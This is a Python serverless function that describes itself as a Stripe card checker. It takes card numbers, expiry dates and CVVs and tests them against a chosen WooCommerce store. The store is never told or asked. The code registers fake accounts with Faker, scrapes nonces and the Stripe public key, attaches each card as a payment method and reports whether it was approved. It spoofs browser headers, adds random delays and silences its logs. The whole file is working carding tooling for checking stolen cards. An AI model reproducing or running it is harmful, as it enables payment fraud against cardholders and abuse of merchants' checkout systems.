# api/check.py - Vercel Serverless Function for Stripe Checking
from http.server import BaseHTTPRequestHandler
import json
import requests
import re
import time
import random
from faker import Faker
from urllib.parse import urlparse, parse_qs
import sys
import os

faker = Faker()

def parse_cc_string(cc_string):
    """Parse credit card string in format: 4147768578745265|04|2026|168"""
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Expected: NUMBER|MM|YYYY|CVV")
    
    card_num = parts[0].strip()
    card_mm = parts[1].strip()
    card_yy = parts[2].strip()[-2:]  # Get last 2 digits of year
    card_cvv = parts[3].strip()
    
    return card_num, card_mm, card_yy, card_cvv

def determine_status(response_text, response_json=None):
    """Determine status based on response message"""
    # First check for 3DS/requires_action and treat as declined
    if "requires_action" in response_text.lower() or "3ds" in response_text.lower():
        return "Declined", "Your Card was Declined"
    
    if response_json and response_json.get("success"):
        return "Approved", "New Payment Method Added Successfully"
    
    # Check for common decline patterns
    decline_patterns = [
        'declined', 'decline', 'fail', 'error', 'invalid', 'incorrect',
        'not authorized', 'unauthorized', 'rejected', 'unsuccessful',
        'card was declined', 'card declined', 'payment declined'
    ]
    
    response_lower = response_text.lower()
    
    for pattern in decline_patterns:
        if pattern in response_lower:
            return "Declined", "Your Card was Declined"
    
    # Check for approval patterns
    approval_patterns = [
        'approved', 'success', 'successful', 'accepted', 'valid',
        'card was approved', 'payment successful', 'setup intent',
        'payment method added', 'new payment method', 'succeeded'
    ]
    
    for pattern in approval_patterns:
        if pattern in response_lower:
            return "Approved", "New Payment Method Added Successfully"
    
    # Default to Declined
    return "Declined", "Your Card was Declined"

def auto_request(session, url, method='GET', headers=None, data=None, params=None):
    """Helper for HTTP requests"""
    if headers is None:
        headers = {}
    
    # Remove cookie headers
    clean_headers = {k: v for k, v in headers.items() if k.lower() != 'cookie'}
    
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'timeout': 15
    }
    
    if data:
        request_kwargs['data'] = data
    if params:
        request_kwargs['params'] = params
    
    if method.upper() == 'POST':
        response = session.post(**request_kwargs)
    else:
        response = session.get(**request_kwargs)
    
    response.raise_for_status()
    return response

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid, base_url):
    """Main processing function - SILENT VERSION"""
    session = requests.Session()
    
    # 1. Try to find account page
    account_patterns = [
        f'{base_url}/my-account/',
        f'{base_url}/my-account-2/',
        f'{base_url}/my-account-3/',
    ]
    
    response_1 = None
    account_url = None
    
    for pattern in account_patterns:
        try:
            headers_1 = {
                'User-Agent': user_ag,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Alt-Used': base_url.replace('https://', ''),
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
            }
            
            response_1 = session.get(pattern, headers=headers_1, timeout=10)
            if response_1.status_code == 200:
                account_url = pattern
                break
        except:
            continue
    
    if not response_1 or not account_url:
        return "Request Failed", "Account page not found"
    
    # Extract registration nonce
    try:
        regester_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        if not regester_nonce_match:
            regester_nonce_match = re.search(r'woocommerce-register-nonce.*?value="(.*?)"', response_1.text)
        
        regester_nonce = regester_nonce_match.group(1) if regester_nonce_match else ""
        time.sleep(random.uniform(1.0, 2.0))
    except:
        return "Request Failed", "Initial request failed"
    
    # 2. Register account
    random_email = faker.email()
    random_username = random_email.split('@')[0]
    
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': account_url,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    data_2 = {
        'email': random_email,
        'username': random_username,
        'password': faker.password(length=12),
        'woocommerce-register-nonce': regester_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    wp_nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', response_1.text)
    if wp_nonce_match:
        data_2['_wpnonce'] = wp_nonce_match.group(1)
    
    try:
        session.post(account_url, headers=headers_2, data=data_2, timeout=10)
        time.sleep(random.uniform(1.0, 2.0))
    except:
        pass
    
    # 3. Find payment page
    payment_patterns = [
        f'{base_url}/my-account/add-payment-method/',
        f'{base_url}/my-account-2/add-payment-method/',
        f'{base_url}/my-account-3/add-payment-method/',
    ]
    
    response_3 = None
    payment_url = None
    
    for pattern in payment_patterns:
        try:
            headers_3 = {
                'User-Agent': user_ag,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Alt-Used': base_url.replace('https://', ''),
                'Connection': 'keep-alive',
                'Referer': f'{base_url}/my-account/payment-methods/',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
            }
            
            response_3 = session.get(pattern, headers=headers_3, timeout=10)
            if response_3.status_code == 200:
                payment_url = pattern
                break
        except:
            continue
    
    if not response_3 or not payment_url:
        return "Request Failed", "Payment page not found"
    
    # Extract setup intent nonce and Stripe key
    try:
        ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_3.text)
        if not ajax_nonce_match:
            ajax_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', response_3.text)
        
        if not ajax_nonce_match:
            return "Request Failed", "Setup intent nonce not found"
        
        ajax_nonce = ajax_nonce_match.group(1)
        
        pk_match = re.search(r'"key":"(pk_[^"]+)"', response_3.text)
        if not pk_match:
            pk_match = re.search(r"'key'\s*:\s*'(pk_[^']+)'", response_3.text)
        
        if not pk_match:
            return "Request Failed", "Stripe public key not found"
        
        pk = pk_match.group(1)
        time.sleep(random.uniform(1.0, 2.0))
    except:
        return "Request Failed", "Payment page parsing failed"
    
    # 4. Create Stripe payment method
    url_4 = 'https://api.stripe.com/v1/payment_methods'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_4 = {
        'type': 'card',
        'card[number]': card_num,
        'card[cvc]': card_cvv,
        'card[exp_year]': card_yy,
        'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(10000, 99999)),
        'client_attribution_metadata[client_session_id]': client_element,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_4 = session.post(url_4, headers=headers_4, data=data_4, timeout=10)
        response_4.raise_for_status()
        
        response_json = response_4.json()
        if 'id' in response_json and response_json['id'].startswith('pm_'):
            pm = response_json['id']
        else:
            return "Declined", "Your Card was Declined"
        
        time.sleep(random.uniform(1.0, 2.0))
    except:
        return "Declined", "Your Card was Declined"
    
    # 5. Confirm setup intent
    headers_5 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': payment_url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    data_5 = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    ajax_endpoints = [f'{base_url}/wp-admin/admin-ajax.php']
    response_5 = None
    
    for endpoint in ajax_endpoints:
        try:
            response_5 = session.post(endpoint, headers=headers_5, data=data_5, timeout=10)
            if response_5.status_code == 200:
                break
        except:
            continue
    
    if not response_5:
        try:
            get_params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }
            response_5 = session.get(f'{base_url}/', params=get_params, headers=headers_5, timeout=10)
        except:
            return "Declined", "Your Card was Declined"
    
    # Determine final status
    try:
        response_json = response_5.json()
        status, message = determine_status(response_5.text, response_json)
    except:
        status, message = determine_status(response_5.text)
    
    return status, message

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Parse query parameters
            parsed_path = urlparse(self.path)
            query_params = parse_qs(parsed_path.query)
            
            # Extract parameters
            gateway = query_params.get('gateway', [''])[0]
            key = query_params.get('key', [''])[0]
            site = query_params.get('site', [''])[0]
            cc = query_params.get('cc', [''])[0]
            
            # Validate
            if not all([gateway, key, site, cc]):
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'status': 'Error',
                    'response': 'Missing parameters. Required: gateway, key, site, cc'
                }).encode())
                return
            
            # Parse CC
            try:
                card_num, card_mm, card_yy, card_cvv = parse_cc_string(cc)
            except ValueError as e:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'status': 'Error',
                    'response': f'Invalid CC format: {str(e)}'
                }).encode())
                return
            
            # Prepare base URL
            if not site.startswith('http'):
                base_url = f'https://{site}'
            else:
                base_url = site
            
            # Default values
            USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
            CLIENT_ELEMENT = f'src_{key.lower()}'
            GUID = f'guid_{key.lower()}'
            MUID = f'muid_{key.lower()}'
            SID = f'sid_{key.lower()}'
            
            # Run process
            status, response_message = run_automated_process(
                card_num=card_num,
                card_cvv=card_cvv,
                card_yy=card_yy,
                card_mm=card_mm,
                user_ag=USER_AGENT,
                client_element=CLIENT_ELEMENT,
                guid=GUID,
                muid=MUID,
                sid=SID,
                base_url=base_url
            )
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'status': status,
                'response': response_message
            }).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'status': 'Error',
                'response': f'Processing error: {str(e)}'
            }).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        # Silence all logs
        pass